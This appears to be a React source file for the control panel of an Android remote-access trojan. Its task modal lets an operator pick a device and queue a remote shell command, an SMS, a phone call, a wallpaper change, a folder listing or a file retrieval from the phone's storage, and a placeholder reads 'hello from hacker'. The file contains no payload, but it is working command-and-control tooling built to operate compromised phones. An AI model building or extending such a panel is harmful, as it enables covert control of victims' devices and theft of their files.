import { useState, useCallback, useEffect } from "react";
import {
  Modal,
  Button,
  Stack,
  TextField,
  TextStyle,
  Layout,
} from "@shopify/polaris";
import Action from "./Action";
import User from "./User";
import { SendMajor, CancelSmallMinor } from "@shopify/polaris-icons";
import axios from "axios";
import { toast } from "react-toastify";

const TaskModal = ({ active, setActive,fetchCommand }) => {
  const [selectedUser, setSelectedUser] = useState(null);
  const [selected, setSelected] = useState(null);
  const toggleActive = useCallback(() => setActive((active) => !active), []);
  const [shell, setshell] = useState(null);
  const [number, setnumber] = useState(null);
  const [data, setdata] = useState(null);
  const handleChange = useCallback((newValue) => setshell(newValue), []);
  const handleChangeData = useCallback((newValue) => setdata(newValue), []);
  const handleChangeNumber = useCallback((newValue) => setnumber(newValue), []);

  const DynamicModal = () => {
    if (selected === "runshell") {
      return (
        <Stack vertical>
          <TextField
            label="Command : "
            value={shell}
            placeholder="uname -a"
            onChange={handleChange}
            autoComplete="off"
            focused={true}
          />
        </Stack>
      );
    } else if (selected === "sendsms") {
      return (
        <Stack vertical={true}>
          <TextField
            label="Phone Number : "
            value={number}
            placeholder="Example: 0000000000"
            onChange={handleChangeNumber}
            autoComplete="off"
            focused={true}
          />

          <TextField
            label="Text Content : "
            value={data}
            placeholder="Example: hello from hacker"
            onChange={handleChangeData}
            autoComplete="off"
            focused={true}
          />
        </Stack>
      );
    } else if (selected === "makecall") {
      return (
        <Stack vertical>
          <TextField
            label="Phone Number : "
            value={number}
            placeholder="Example: 0000000000"
            onChange={handleChangeNumber}
            autoComplete="off"
            focused={true}
          />
        </Stack>
      );
    } else if (selected === "changewallpaper") {
      return (
        <Stack vertical>
          <TextField
            label="Wallpaper URL : "
            value={data}
            placeholder="Example: https://example.com/wallpaper.jpg"
            onChange={handleChangeData}
            autoComplete="off"
            focused={true}
          />
        </Stack>
      );
    } else if (selected === "listfile") {
      return (
        <Stack vertical={true}>
          <TextStyle variation="subdued">
            Base Folder : /storage/emulated/0/
          </TextStyle>
          <TextField
            label="Folder Path : "
            value={data}
            placeholder="Example: /storage/emulated/0/Pictures"
            onChange={handleChangeData}
            autoComplete="off"
            focused={true}
          />
        </Stack>
      );
    } else if (selected === "getfile") {
      return (
        <Stack vertical={true}>
          <TextStyle variation="subdued">
            Base Folder : /storage/emulated/0/Pictures/example.jpg
          </TextStyle>
          <TextField
            label="File Path : "
            value={data}
            placeholder="Example: /storage/emulated/0/Pictures/example.jpg"
            onChange={handleChangeData}
            autoComplete="off"
            focused={true}
          />
        </Stack>
      );
    } else {
      return <div></div>;
    }
  };

  const ExcuteCommand = () => {
    const PostData = {
      device_id: selectedUser,
      command: selected,
      shell: shell,
      number: number,
      data: data,
    };
    axios
      .post("/command/add", PostData)
      .then((res) => {
        console.log(PostData);
        toast.success("Task Added Successfully");
        setshell(null);
        setnumber(null);
        setdata(null);
      })
      .catch((err) => {
        toast.error("Error Occured");
      });
  };

  const RunTask = () => {
    ExcuteCommand();
    toggleActive();
    fetchCommand()
  };
  return (
    <div style={{ height: "500px" }}>
      <Modal
        large
        open={active}
        onClose={toggleActive}
        title="Run Task"
        primaryAction={{
          content: "Execute",
          onAction: RunTask,
          icon: SendMajor,
        }}
        secondaryActions={[
          {
            content: "Cancel",
            onAction: toggleActive,
            icon: CancelSmallMinor,
          },
        ]}
      >
        <Modal.Section>
          <Layout>
            <Layout.Section oneHalf>
              <User selected={selectedUser} setSelected={setSelectedUser} />
            </Layout.Section>
            <Layout.Section oneHalf>
              <Action selected={selected} setSelected={setSelected} />
            </Layout.Section>
          </Layout>
          <br></br>
          <DynamicModal />
        </Modal.Section>
      </Modal>
    </div>
  );
};

export default TaskModal;
